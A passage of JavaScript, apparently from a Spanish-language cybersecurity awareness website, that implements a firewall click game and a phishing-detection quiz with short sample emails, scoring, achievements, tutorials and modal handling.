        scoreDisplay.innerText = `Score: ${gameScore} | Nivel: ${firewallLevel} | Ronda: ${firewallRound}`;
    }, intervalo);

    // Control por teclado
    if (keyboardMode) {
        document.addEventListener('keydown', manejarTecladoFirewall);
    }

    // Temporizador visual
    let timeLeft = 20;
    const timerInterval = setInterval(() => {
        timeLeft--;
        timerBar.style.width = (timeLeft / 20) * 100 + '%';
        timerText.innerText = timeLeft + 's';
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            timerDiv.style.display = 'none';
            if (keyboardMode) {
                document.removeEventListener('keydown', manejarTecladoFirewall);
            }
        }
    }, 1000);

    // El juego dura 20 segundos
    setTimeout(() => {
        clearInterval(gameInterval);
        clearInterval(timerInterval);
        timerDiv.style.display = 'none';
        if (keyboardMode) {
            document.removeEventListener('keydown', manejarTecladoFirewall);
        }
        finalizarJuegoFirewall();
    }, 20000);
}

function mostrarTutorialFirewall() {
    const modal = document.createElement('div');
    modal.className = 'modal-overlay show-modal';
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 500px;">
            <div class="modal-header">
                <h3><i class="fas fa-shield-alt"></i> Tutorial: Firewall Defender</h3>
                <button onclick="cerrarTutorialFirewall()" class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <p><strong>¿Qué es un firewall?</strong> Es un sistema que protege la red bloqueando amenazas entrantes.</p>
                <p><strong>Cómo jugar:</strong></p>
                <ul style="text-align: left; margin: 10px 0;">
                    <li><span style="color: var(--danger);">Rojo</span>: Amenazas (phishing, malware, spam) - ¡Elimínalas!</li>
                    <li><span style="color: var(--success);">Verde</span>: Tráfico legítimo - Déjalos pasar</li>
                    <li>Haz clic en los paquetes rojos o presiona 'D' en modo teclado</li>
                </ul>
                <p>¡Protege la red y gana puntos!</p>
                <div style="margin-top: 15px;">
                    <label><input type="checkbox" id="keyboard-toggle" onchange="keyboardMode = this.checked;"> Activar modo teclado (presiona 'D' para eliminar)</label>
                </div>
            </div>
            <div class="modal-footer">
                <button onclick="cerrarTutorialFirewall()" class="btn-primary">¡Entendido!</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';
}

function cerrarTutorialFirewall() {
    const modal = document.querySelector('.modal-overlay');
    if (modal) {
        keyboardMode = document.getElementById('keyboard-toggle').checked;
        modal.remove();
        document.body.style.overflow = 'auto';
        localStorage.setItem('firewallTutorialShown', 'true');
        firewallTutorialShown = true;
        iniciarFirewall();
    }
}

function manejarTecladoFirewall(event) {
    if (event.key.toLowerCase() === 'd') {
        // Eliminar el paquete rojo más cercano o visible
        const paquetesRojos = document.querySelectorAll('#game-container > div[style*="var(--danger)"]');
        if (paquetesRojos.length > 0) {
            const paquete = paquetesRojos[0]; // El primero
            paquete.click(); // Simular clic
        }
    }
}

function crearPaquete(container) {
    // Seleccionar tipo de paquete basado en nivel
    const paquetesDisponibles = tiposPaquetes.filter(p => p.esAmenaza || firewallLevel > 1); // Solo amenazas en nivel 1, luego todos
    const paqueteData = paquetesDisponibles[Math.floor(Math.random() * paquetesDisponibles.length)];
    
    const paquete = document.createElement("div");
    
    paquete.style.position = "absolute";
    paquete.style.left = Math.random() * 90 + "%";
    paquete.style.top = "-20px";
    paquete.style.padding = "5px 10px";
    paquete.style.borderRadius = "4px";
    paquete.style.cursor = "pointer";
    paquete.style.fontSize = "0.7rem";
    paquete.style.transition = "top 4s linear";
    paquete.style.background = paqueteData.color;
    paquete.innerHTML = `<i class="${paqueteData.icono}"></i> ${paqueteData.texto}`;
    paquete.dataset.explicacion = paqueteData.explicacion;
    paquete.dataset.esAmenaza = paqueteData.esAmenaza;

    paquete.onclick = () => {
        manejarClicPaquete(paquete);
    };

    container.appendChild(paquete);
    setTimeout(() => paquete.style.top = "320px", 50);
    setTimeout(() => {
        if (paquete.parentElement) {
            paquete.remove();
            if (!paqueteData.esAmenaza) {
                // Si es legítimo y no se eliminó, bonus por dejar pasar
                gameScore += 5;
                mostrarFeedback("¡Bien! Dejaste pasar tráfico legítimo", "success");
                reproducirSonido(true);
            }
        }
    }, 4000);
}

function manejarClicPaquete(paquete) {
    const esAmenaza = paquete.dataset.esAmenaza === 'true';
    const explicacion = paquete.dataset.explicacion;
    
    if (esAmenaza) {
        gameScore += 10 + (firewallLevel * 2); // Bonus por nivel
        mostrarFeedback(`¡Amenaza bloqueada! ${explicacion}`, "success");
        reproducirSonido(true);
        registrarEvento("Amenaza bloqueada correctamente", "SUCCESS");
    } else {
        gameScore -= 5;
        mostrarFeedback(`¡Error! Bloqueaste tráfico legítimo. ${explicacion}`, "danger");
        reproducirSonido(false);
        registrarEvento("Tráfico legítimo bloqueado por error", "LOW");
    }
    
    document.getElementById("game-score").innerText = `Score: ${gameScore} | Nivel: ${firewallLevel} | Ronda: ${firewallRound}`;
    paquete.remove();
}

function mostrarFeedback(mensaje, tipo) {
    const feedback = document.createElement('div');
    feedback.className = 'game-feedback';
    feedback.innerHTML = `<i class="fas fa-${tipo === 'success' ? 'check' : 'times'}-circle"></i> ${mensaje}`;
    feedback.style.color = `var(--${tipo})`;
    
    const container = document.getElementById("game-container");
    container.appendChild(feedback);
    
    setTimeout(() => {
        if (feedback.parentElement) {
            feedback.remove();
        }
    }, 2000);
}

function finalizarJuegoFirewall() {
    // Actualizar estadísticas
    firewallStats.gamesPlayed++;
    firewallStats.totalScore += gameScore;
    firewallStats.bestScore = Math.max(firewallStats.bestScore, gameScore);
    firewallStats.accuracy = (firewallStats.totalScore / (firewallStats.gamesPlayed * 100)) * 100; // Asumiendo ~100 puntos max
    
    localStorage.setItem('firewallStats', JSON.stringify(firewallStats));
    
    const resultDiv = document.getElementById('game-result');
    let mensaje = `¡Defensa completada! Score: ${gameScore}`;
    
    // Logros
    if (gameScore >= 150) {
        mensaje += '<br><i class="fas fa-shield-alt" style="color: gold;"></i> ¡Logro desbloqueado: Guardián Maestro!';
        ganarPuntos(20, 'Logro: Guardián Maestro');
    } else if (gameScore >= 80) {
        mensaje += '<br><i class="fas fa-shield-alt" style="color: silver;"></i> ¡Logro desbloqueado: Defensor Experto!';
        ganarPuntos(10, 'Logro: Defensor Experto');
    }
      
    // Mostrar estadísticas
    mensaje += `<br><small>Juegos: ${firewallStats.gamesPlayed} | Mejor: ${firewallStats.bestScore} | Precisión: ${firewallStats.accuracy.toFixed(1)}%</small>`;
    
    resultDiv.innerHTML = mensaje;
    resultDiv.style.display = 'block';
    registrarEvento(`Defensa completada. Score: ${gameScore}`, "SUCCESS");
    ganarPuntos(gameScore, 'Puntuación en Firewall Defender');
}

function mostrarEstadisticasFirewall() {
    const stats = JSON.parse(localStorage.getItem('firewallStats')) || { gamesPlayed: 0, totalScore: 0, bestScore: 0, accuracy: 0 };
    
    const modal = document.createElement('div');
    modal.className = 'modal-overlay show-modal';
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 400px;">
            <div class="modal-header">
                <h3><i class="fas fa-shield-alt"></i> Estadísticas de Firewall Defender</h3>
                <button onclick="this.parentElement.parentElement.parentElement.remove(); document.body.style.overflow = 'auto';" class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <div style="text-align: center; margin: 20px 0;">
                    <div style="font-size: 2rem; color: var(--accent); font-weight: bold;">${stats.bestScore}</div>
                    <div style="color: var(--text-s);">Mejor Puntuación</div>
                </div>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0;">
                    <div style="text-align: center;">
                        <div style="font-size: 1.5rem; color: var(--success); font-weight: bold;">${stats.gamesPlayed}</div>
                        <div style="color: var(--text-s); font-size: 0.8rem;">Defensas</div>
                    </div>
                    <div style="text-align: center;">
                        <div style="font-size: 1.5rem; color: var(--warning); font-weight: bold;">${stats.accuracy.toFixed(1)}%</div>
                        <div style="color: var(--text-s); font-size: 0.8rem;">Precisión</div>
                    </div>
                </div>
                <div style="margin-top: 20px;">
                    <h4>Logros Desbloqueados:</h4>
                    <div style="display: flex; gap: 10px; flex-wrap: wrap; margin-top: 10px;">
                        ${stats.bestScore >= 150 ? '<span style="background: gold; color: black; padding: 5px 10px; border-radius: 15px; font-size: 0.8rem;"><i class="fas fa-shield-alt"></i> Maestro</span>' : ''}
                        ${stats.bestScore >= 80 ? '<span style="background: silver; color: black; padding: 5px 10px; border-radius: 15px; font-size: 0.8rem;"><i class="fas fa-shield-alt"></i> Experto</span>' : ''}
                        ${stats.gamesPlayed >= 10 ? '<span style="background: #cd7f32; color: white; padding: 5px 10px; border-radius: 15px; font-size: 0.8rem;"><i class="fas fa-shield-alt"></i> Veterano</span>' : ''}
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button onclick="iniciarModoPracticaFirewall()" class="btn-primary">Modo Práctica</button>
                <button onclick="this.parentElement.parentElement.parentElement.remove(); document.body.style.overflow = 'auto';" class="btn-secondary">Cerrar</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';
}

function iniciarModoPracticaFirewall() {
    // Cerrar modal
    document.querySelector('.modal-overlay').remove();
    document.body.style.overflow = 'auto';
    
    const container = document.getElementById("game-container");
    const scoreDisplay = document.getElementById("game-score");
    const resultDiv = document.getElementById('game-result');
    
    container.innerHTML = "";
    gameScore = 0;
    firewallLevel = 1;
    firewallRound = 1;
    scoreDisplay.innerText = "Modo Práctica | Score: 0 | Nivel: 1";
    resultDiv.style.display = 'none';
    
    registrarEvento("Iniciando modo práctica de firewall...", "INFO");
    
    let intervalo = 1000;
    gameInterval = setInterval(() => {
        crearPaquetePractica(container);
        firewallRound++;
        if (firewallRound % 15 === 0) {
            firewallLevel++;
            intervalo = Math.max(intervalo - 100, 500);
            clearInterval(gameInterval);
            gameInterval = setInterval(() => crearPaquetePractica(container), intervalo);
        }
        scoreDisplay.innerText = `Modo Práctica | Score: ${gameScore} | Nivel: ${firewallLevel}`;
    }, intervalo);
    
    // Control por teclado
    if (keyboardMode) {
        document.addEventListener('keydown', manejarTecladoFirewall);
    }
}

function crearPaquetePractica(container) {
    const paquetesDisponibles = tiposPaquetes;
    const paqueteData = paquetesDisponibles[Math.floor(Math.random() * paquetesDisponibles.length)];
    
    const paquete = document.createElement("div");
    
    paquete.style.position = "absolute";
    paquete.style.left = Math.random() * 90 + "%";
    paquete.style.top = "-20px";
    paquete.style.padding = "5px 10px";
    paquete.style.borderRadius = "4px";
    paquete.style.cursor = "pointer";
    paquete.style.fontSize = "0.7rem";
    paquete.style.transition = "top 4s linear";
    paquete.style.background = paqueteData.color;
    paquete.innerHTML = `<i class="${paqueteData.icono}"></i> ${paqueteData.texto}`;
    paquete.dataset.explicacion = paqueteData.explicacion;
    paquete.dataset.esAmenaza = paqueteData.esAmenaza;

    paquete.onclick = () => {
        manejarClicPaquete(paquete);
    };

    container.appendChild(paquete);
    setTimeout(() => paquete.style.top = "320px", 50);
    setTimeout(() => {
        if (paquete.parentElement) {
            paquete.remove();
            if (!paqueteData.esAmenaza) {
                gameScore += 5;
                mostrarFeedback("¡Bien! Dejaste pasar tráfico legítimo", "success");
                reproducirSonido(true);
            }
        }
    }, 4000);
}

function detenerModoPracticaFirewall() {
    if (gameInterval) clearInterval(gameInterval);
    if (keyboardMode) {
        document.removeEventListener('keydown', manejarTecladoFirewall);
    }
    const resultDiv = document.getElementById('game-result');
    resultDiv.innerHTML = `Modo práctica terminado. Puntuación final: ${gameScore}<br><small>¡Sigue practicando para mejorar tus habilidades de defensa!</small>`;
    resultDiv.style.display = 'block';
    registrarEvento(`Modo práctica completado. Score: ${gameScore}`, "SUCCESS");
    ganarPuntos(Math.floor(gameScore / 10), 'Puntuación en Modo Práctica Firewall');
}

// --- PHISHING DETECTOR GAME ---
let phishingInterval;

const correosEjemplo = [
    // Nivel 1: Fácil
    { subject: "Actualización de Seguridad Urgente", body: "Haz clic aquí para verificar tu cuenta bancaria.", isPhishing: true, dificultad: 1, explicacion: "Los correos de bancos reales nunca piden datos sensibles por email." },
    { subject: "Factura de Amazon", body: "Tu pedido ha sido enviado. Revisa los detalles.", isPhishing: false, dificultad: 1, explicacion: "Es un correo legítimo de confirmación de compra." },
    { subject: "Ganaste un iPhone Gratis", body: "¡Felicidades! Reclama tu premio ahora.", isPhishing: true, dificultad: 1, explicacion: "Los premios inesperados son una señal clásica de phishing." },
    { subject: "Confirmación de Reserva", body: "Tu vuelo está confirmado. Imprime tu boleto.", isPhishing: false, dificultad: 1, explicacion: "Correo estándar de aerolínea con información de viaje." },
    { subject: "Problema con tu Cuenta", body: "Ingresa tus datos para resolver el issue.", isPhishing: true, dificultad: 1, explicacion: "Pide datos personales sin contexto específico." },
    
    // Nivel 2: Medio
    { subject: "Actualización de Política de Privacidad", body: "Hemos actualizado nuestros términos. Revisa el enlace adjunto.", isPhishing: true, dificultad: 2, explicacion: "Enlaces adjuntos en correos de política pueden contener malware." },
    { subject: "Recordatorio de Cita Médica", body: "Tu cita con el Dr. García es mañana a las 10:00.", isPhishing: false, dificultad: 2, explicacion: "Correo de recordatorio legítimo de un servicio médico." },
    { subject: "Oferta Especial: 50% Descuento", body: "Solo por hoy, accede a nuestro sitio para reclamar.", isPhishing: true, dificultad: 2, explicacion: "Ofertas urgentes con enlaces son sospechosas." },
    { subject: "Estado de tu Solicitud", body: "Tu aplicación ha sido procesada exitosamente.", isPhishing: false, dificultad: 2, explicacion: "Notificación estándar de procesamiento de solicitud." },
    { subject: "Verificación de Identidad Requerida", body: "Por favor, confirma tu identidad haciendo clic aquí.", isPhishing: true, dificultad: 2, explicacion: "Las verificaciones reales no se hacen por email con enlaces." },
    
    // Nivel 3: Difícil
    { subject: "Actualización de Software Importante", body: "Descarga la nueva versión desde nuestro servidor seguro.", isPhishing: true, dificultad: 3, explicacion: "Descargas inesperadas pueden contener virus." },
    { subject: "Confirmación de Transferencia Bancaria", body: "Se ha realizado una transferencia de $500 a tu cuenta.", isPhishing: false, dificultad: 3, explicacion: "Notificación legítima de transacción bancaria." },
    { subject: "Invitación a Webinar Exclusivo", body: "Únete a nuestro seminario sobre ciberseguridad avanzada.", isPhishing: true, dificultad: 3, explicacion: "Invitaciones con enlaces a dominios desconocidos." },
    { subject: "Actualización de tu Perfil", body: "Hemos actualizado tu información de perfil automáticamente.", isPhishing: false, dificultad: 3, explicacion: "Notificación automática de cambios en el perfil." },
    { subject: "Alerta de Seguridad: Actividad Sospechosa", body: "Detectamos actividad inusual. Verifica tu cuenta inmediatamente.", isPhishing: true, dificultad: 3, explicacion: "Aunque parece legítimo, pide acción inmediata sin detalles." }
];

// Variables globales para phishing
let phishingScore = 0;
let phishingLevel = 1;
let phishingRound = 1;
let phishingStats = JSON.parse(localStorage.getItem('phishingStats')) || { gamesPlayed: 0, totalScore: 0, bestScore: 0, accuracy: 0 };
let phishingTutorialShown = localStorage.getItem('phishingTutorialShown') === 'true';

function iniciarPhishing() {
    // Mostrar tutorial si no se ha mostrado
    if (!phishingTutorialShown) {
        mostrarTutorialPhishing();
        return;
    }

    const container = document.getElementById("phishing-container");
    const scoreDisplay = document.getElementById("phishing-score");
    const resultDiv = document.getElementById('phishing-result');
    const timerDiv = document.getElementById('phishing-timer');
    const timerBar = document.getElementById('phishing-timer-bar');
    const timerText = document.getElementById('phishing-timer-text');
    
    container.innerHTML = "";
    phishingScore = 0;
    phishingRound = 1;
    phishingLevel = 1;
    scoreDisplay.innerText = "Score: 0 | Nivel: 1 | Ronda: 1";
    resultDiv.style.display = 'none';
    timerDiv.style.display = 'block';
    timerBar.style.width = '100%';
    timerText.innerText = '30s';
    registrarEvento("Iniciando práctica de detección de phishing...", "INFO");

    if (phishingInterval) clearInterval(phishingInterval);

    mostrarCorreo(container);

    // Temporizador visual
    let timeLeft = 30;
    const timerInterval = setInterval(() => {
        timeLeft--;
        timerBar.style.width = (timeLeft / 30) * 100 + '%';
        timerText.innerText = timeLeft + 's';
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            timerDiv.style.display = 'none';
        }
    }, 1000);

    // El juego dura 30 segundos
    setTimeout(() => {
        clearInterval(phishingInterval);
        clearInterval(timerInterval);
        timerDiv.style.display = 'none';
        finalizarJuegoPhishing();
    }, 30000);
}

function mostrarTutorialPhishing() {
    const modal = document.createElement('div');
    modal.className = 'modal-overlay show-modal';
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 500px;">
            <div class="modal-header">
                <h3><i class="fas fa-graduation-cap"></i> Tutorial: Phishing Detector</h3>
                <button onclick="cerrarTutorialPhishing()" class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <p><strong>¿Qué es el phishing?</strong> Es un intento de obtener información sensible haciéndose pasar por una entidad confiable.</p>
                <p><strong>Señales de alerta:</strong></p>
                <ul style="text-align: left; margin: 10px 0;">
                    <li>Correos urgentes pidiendo acción inmediata</li>
                    <li>Enlaces o adjuntos inesperados</li>
                    <li>Errores gramaticales o dominios sospechosos</li>
                    <li>Solicitudes de datos personales o financieros</li>
                </ul>
                <p><strong>Cómo jugar:</strong> Clasifica cada correo como "Phishing" o "Legítimo". Gana puntos por respuestas correctas y pierde por incorrectas.</p>
                <p>¡Buena suerte!</p>
            </div>
            <div class="modal-footer">
                <button onclick="cerrarTutorialPhishing()" class="btn-primary">¡Entendido!</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';
}

function cerrarTutorialPhishing() {
    const modal = document.querySelector('.modal-overlay');
    if (modal) {
        modal.remove();
        document.body.style.overflow = 'auto';
        localStorage.setItem('phishingTutorialShown', 'true');
        phishingTutorialShown = true;
        iniciarPhishing();
    }
}

function mostrarCorreo(container) {
    // Filtrar correos por nivel actual
    const correosNivel = correosEjemplo.filter(c => c.dificultad <= phishingLevel);
    const index = Math.floor(Math.random() * correosNivel.length);
    const correo = correosNivel[index];
    
    const emailDiv = document.createElement("div");
    emailDiv.className = "email-display";
    emailDiv.innerHTML = `
        <div class="email-header">
            <strong>Asunto:</strong> ${correo.subject}
        </div>
        <div class="email-body">
            ${correo.body}
        </div>
        <div class="email-actions">
            <button class="btn-secondary" onclick="clasificarCorreo(true, ${correo.isPhishing}, this.parentElement.parentElement, '${correo.explicacion.replace(/'/g, "\\'")}')">Es Phishing</button>
            <button class="btn-secondary" onclick="clasificarCorreo(false, ${correo.isPhishing}, this.parentElement.parentElement, '${correo.explicacion.replace(/'/g, "\\'")}')">Es Legítimo</button>
        </div>
    `;
    
    container.innerHTML = "";
    container.appendChild(emailDiv);
}

function clasificarCorreo(esPhishing, realPhishing, element, explicacion) {
    const feedbackDiv = document.createElement('div');
    feedbackDiv.className = 'game-feedback';
    
    if (esPhishing === realPhishing) {
        phishingScore += 10 + (phishingLevel * 2); // Puntos extra por nivel
        feedbackDiv.innerHTML = `<i class="fas fa-check-circle" style="color: var(--success);"></i> ¡Correcto! ${explicacion}`;
        feedbackDiv.style.color = 'var(--success)';
        reproducirSonido(true);
        registrarEvento("Correo clasificado correctamente", "SUCCESS");
    } else {
        phishingScore -= 5;
        feedbackDiv.innerHTML = `<i class="fas fa-times-circle" style="color: var(--danger);"></i> Incorrecto. ${explicacion}`;
        feedbackDiv.style.color = 'var(--danger)';
        reproducirSonido(false);
        registrarEvento("Clasificación incorrecta", "LOW");
    }
    
    element.appendChild(feedbackDiv);
    
    // Actualizar nivel y ronda
    phishingRound++;
    if (phishingRound > 5) { // Cada 5 rondas, subir nivel
        phishingLevel++;
        phishingRound = 1;
    }
    
    document.getElementById("phishing-score").innerText = `Score: ${phishingScore} | Nivel: ${phishingLevel} | Ronda: ${phishingRound}`;
    
    setTimeout(() => {
        element.removeChild(feedbackDiv);
        mostrarCorreo(element.parentElement);
    }, 2000);
}

function finalizarJuegoPhishing() {
    // Actualizar estadísticas
    phishingStats.gamesPlayed++;
    phishingStats.totalScore += phishingScore;
    phishingStats.bestScore = Math.max(phishingStats.bestScore, phishingScore);
    phishingStats.accuracy = (phishingStats.totalScore / (phishingStats.gamesPlayed * 50)) * 100; // Asumiendo ~50 puntos max por juego
    
    localStorage.setItem('phishingStats', JSON.stringify(phishingStats));
    
    const resultDiv = document.getElementById('phishing-result');
    let mensaje = `¡Práctica terminada! Score: ${phishingScore}`;
    
    // Logros
    if (phishingScore >= 100) {
        mensaje += '<br><i class="fas fa-trophy" style="color: gold;"></i> ¡Logro desbloqueado: Maestro Detector!';
        ganarPuntos(20, 'Logro: Maestro Detector');
        reproducirSonido(true); // Sonido de logro
    } else if (phishingScore >= 50) {
        mensaje += '<br><i class="fas fa-medal" style="color: silver;"></i> ¡Logro desbloqueado: Detector Experto!';
        ganarPuntos(10, 'Logro: Detector Experto');
        reproducirSonido(true);
    }
    
    // Mostrar estadísticas
    mensaje += `<br><small>Estadísticas: Juegos: ${phishingStats.gamesPlayed} | Mejor: ${phishingStats.bestScore} | Precisión: ${phishingStats.accuracy.toFixed(1)}%</small>`;
    
    resultDiv.innerHTML = mensaje;
    resultDiv.style.display = 'block';
    registrarEvento(`Práctica completada. Score: ${phishingScore}`, "SUCCESS");
    ganarPuntos(phishingScore, 'Puntuación en Phishing Detector');
}

// Función para sonidos simples
function reproducirSonido(exito) {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        
        oscillator.frequency.setValueAtTime(exito ? 800 : 400, audioContext.currentTime);
        oscillator.type = 'sine';
        
        gainNode.gain.setValueAtTime(0.1, audioContext.currentTime);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
        
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + 0.5);
    } catch (e) {
        // Silencio si no soporta Web Audio
    }
}

function mostrarEstadisticasPhishing() {
    const stats = JSON.parse(localStorage.getItem('phishingStats')) || { gamesPlayed: 0, totalScore: 0, bestScore: 0, accuracy: 0 };
    
    const modal = document.createElement('div');
    modal.className = 'modal-overlay show-modal';
    modal.innerHTML = `
        <div class="modal-content" style="max-width: 400px;">
            <div class="modal-header">
                <h3><i class="fas fa-chart-bar"></i> Estadísticas de Phishing Detector</h3>
                <button onclick="this.parentElement.parentElement.parentElement.remove(); document.body.style.overflow = 'auto';" class="close-btn">&times;</button>
            </div>
            <div class="modal-body">
                <div style="text-align: center; margin: 20px 0;">
                    <div style="font-size: 2rem; color: var(--accent); font-weight: bold;">${stats.bestScore}</div>
                    <div style="color: var(--text-s);">Mejor Puntuación</div>
                </div>
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0;">
                    <div style="text-align: center;">
                        <div style="font-size: 1.5rem; color: var(--success); font-weight: bold;">${stats.gamesPlayed}</div>
                        <div style="color: var(--text-s); font-size: 0.8rem;">Juegos Jugados</div>
                    </div>
                    <div style="text-align: center;">
                        <div style="font-size: 1.5rem; color: var(--warning); font-weight: bold;">${stats.accuracy.toFixed(1)}%</div>
                        <div style="color: var(--text-s); font-size: 0.8rem;">Precisión Media</div>
                    </div>
                </div>
                <div style="margin-top: 20px;">
                    <h4>Logros Desbloqueados:</h4>
                    <div style="display: flex; gap: 10px; flex-wrap: wrap; margin-top: 10px;">
                        ${stats.bestScore >= 100 ? '<span style="background: gold; color: black; padding: 5px 10px; border-radius: 15px; font-size: 0.8rem;"><i class="fas fa-trophy"></i> Maestro</span>' : ''}
                        ${stats.bestScore >= 50 ? '<span style="background: silver; color: black; padding: 5px 10px; border-radius: 15px; font-size: 0.8rem;"><i class="fas fa-medal"></i> Experto</span>' : ''}
                        ${stats.gamesPlayed >= 10 ? '<span style="background: #cd7f32; color: white; padding: 5px 10px; border-radius: 15px; font-size: 0.8rem;"><i class="fas fa-star"></i> Veterano</span>' : ''}
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button onclick="iniciarModoPractica()" class="btn-primary">Modo Práctica Ilimitado</button>
                <button onclick="this.parentElement.parentElement.parentElement.remove(); document.body.style.overflow = 'auto';" class="btn-secondary">Cerrar</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    document.body.style.overflow = 'hidden';
}

function iniciarModoPractica() {
    // Cerrar modal de estadísticas
    document.querySelector('.modal-overlay').remove();
    document.body.style.overflow = 'auto';
    
    // Iniciar modo práctica (sin tiempo límite)
    const container = document.getElementById("phishing-container");
    const scoreDisplay = document.getElementById("phishing-score");
    const resultDiv = document.getElementById('phishing-result');
    
    container.innerHTML = "";
    phishingScore = 0;
    phishingLevel = 1;
    phishingRound = 1;
    scoreDisplay.innerText = "Modo Práctica | Score: 0 | Nivel: 1 | Ronda: 1";
    resultDiv.style.display = 'none';
    
    registrarEvento("Iniciando modo práctica de phishing...", "INFO");
    
    mostrarCorreoPractica(container);
}

function mostrarCorreoPractica(container) {
    const correosNivel = correosEjemplo.filter(c => c.dificultad <= phishingLevel);
    const index = Math.floor(Math.random() * correosNivel.length);
    const correo = correosNivel[index];
    
    const emailDiv = document.createElement("div");
    emailDiv.className = "email-display";
    emailDiv.innerHTML = `
        <div class="email-header">
            <strong>Asunto:</strong> ${correo.subject}
        </div>
        <div class="email-body">
            ${correo.body}
        </div>
        <div class="email-actions">
            <button class="btn-secondary" onclick="clasificarCorreoPractica(true, ${correo.isPhishing}, this.parentElement.parentElement, '${correo.explicacion.replace(/'/g, "\\'")}')">Es Phishing</button>
            <button class="btn-secondary" onclick="clasificarCorreoPractica(false, ${correo.isPhishing}, this.parentElement.parentElement, '${correo.explicacion.replace(/'/g, "\\'")}')">Es Legítimo</button>
            <button class="btn-secondary" onclick="detenerModoPractica()" style="background: var(--danger); margin-top: 10px;">Terminar Práctica</button>
        </div>
    `;
    
    container.innerHTML = "";
    container.appendChild(emailDiv);
}

function clasificarCorreoPractica(esPhishing, realPhishing, element, explicacion) {
    const feedbackDiv = document.createElement('div');
    feedbackDiv.className = 'game-feedback';
    
    if (esPhishing === realPhishing) {
        phishingScore += 10 + (phishingLevel * 2);
        feedbackDiv.innerHTML = `<i class="fas fa-check-circle" style="color: var(--success);"></i> ¡Correcto! ${explicacion}`;
        feedbackDiv.style.color = 'var(--success)';
        reproducirSonido(true);
    } else {
        phishingScore -= 5;
        feedbackDiv.innerHTML = `<i class="fas fa-times-circle" style="color: var(--danger);"></i> Incorrecto. ${explicacion}`;
        feedbackDiv.style.color = 'var(--danger)';
        reproducirSonido(false);
    }
    
    element.appendChild(feedbackDiv);
    
    // Actualizar nivel y ronda
    phishingRound++;
    if (phishingRound > 5) {
        phishingLevel++;
        phishingRound = 1;
    }
    
    document.getElementById("phishing-score").innerText = `Modo Práctica | Score: ${phishingScore} | Nivel: ${phishingLevel} | Ronda: ${phishingRound}`;
    
    setTimeout(() => {
        element.removeChild(feedbackDiv);
        mostrarCorreoPractica(element.parentElement);
    }, 2000);
}

function detenerModoPractica() {
    const resultDiv = document.getElementById('phishing-result');
    resultDiv.innerHTML = `Modo práctica terminado. Puntuación final: ${phishingScore}<br><small>¡Sigue practicando para mejorar tus habilidades!</small>`;
    resultDiv.style.display = 'block';
    registrarEvento(`Modo práctica completado. Score: ${phishingScore}`, "SUCCESS");
    ganarPuntos(Math.floor(phishingScore / 10), 'Puntuación en Modo Práctica');
}

// Lógica de Modales de Guías
function openModal(modalId) {
    const modal = document.getElementById(modalId);
    if(modal) {
        modal.classList.add('show-modal');
        document.body.style.overflow = 'hidden'; // Evita scroll de fondo
    }
}

function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if(modal) {
        // Para el modal de contraseña generada (dinámico), lo removemos del DOM.
        if (modalId === 'generated-password-modal') {
            modal.classList.remove('show-modal'); // Para permitir animaciones de salida
            setTimeout(() => modal.remove(), 300); // Eliminar después de un breve retraso
        } else {
            // Para otros modales estáticos, solo removemos la clase para ocultarlos.
            modal.classList.remove('show-modal');
        }
        document.body.style.overflow = 'auto'; // Restaura scroll
    }
}

// Cerrar modal al hacer clic fuera del contenido
window.addEventListener('click', (e) => {
    if (e.target.classList.contains('modal-overlay')) {
        const modal = e.target;
        if (modal.id === 'generated-password-modal') {
            modal.classList.remove('show-modal');
            setTimeout(() => modal.remove(), 300);
        } else {
            modal.classList.remove('show-modal');
        }
        document.body.style.overflow = 'auto';
    }
});

// Lógica para Glosario y Modo Estudio
function toggleStudyMode() {
    const isChecked = document.getElementById('study-mode-toggle').checked;
    const glosarioGrid = document.getElementById('glosario-grid');
    
    if (isChecked) {
        glosarioGrid.classList.add('study-mode-active');
    } else {
        glosarioGrid.classList.remove('study-mode-active');
    }
}

function flipCard(cardElement) {
    // Alterna la clase is-flipped para dispositivos táctiles
    cardElement.classList.toggle('is-flipped');
}

// --- Lógica del Carrusel de Alertas ---
let slideIndex = 0;
let carouselTimer;

function showSlide(index) {
    const slides = document.querySelectorAll('.alert-slide');
    const dots = document.querySelectorAll('.dot');
    
    if (slides.length === 0) return;
    
    if (index >= slides.length) slideIndex = 0;
    else if (index < 0) slideIndex = slides.length - 1;
    else slideIndex = index;
    
    slides.forEach(slide => slide.classList.remove('active-slide'));
    dots.forEach(dot => dot.classList.remove('active'));
    
    slides[slideIndex].classList.add('active-slide');
    if(dots[slideIndex]) dots[slideIndex].classList.add('active');
}

function nextSlide() {
    showSlide(slideIndex + 1);
}

function currentSlide(index) {
    clearInterval(carouselTimer);
    showSlide(index);
    startCarousel();
}

function startCarousel() {
    // Inicia si aún no hay timer y existen los elementos
    if(document.querySelector('.alert-slide')) {
        carouselTimer = setInterval(nextSlide, 6000);
    }
}

// Iniciar al cargar
document.addEventListener('DOMContentLoaded', () => {
    startCarousel();
    simuladorAmenazas();
    
    // Cargar tema guardado
    const savedTheme = localStorage.getItem('selectedTheme') || 'default';
    changeTheme(savedTheme);
    
    // Actualizar ícono del toggle
    const icon = document.querySelector('#theme-toggle i');
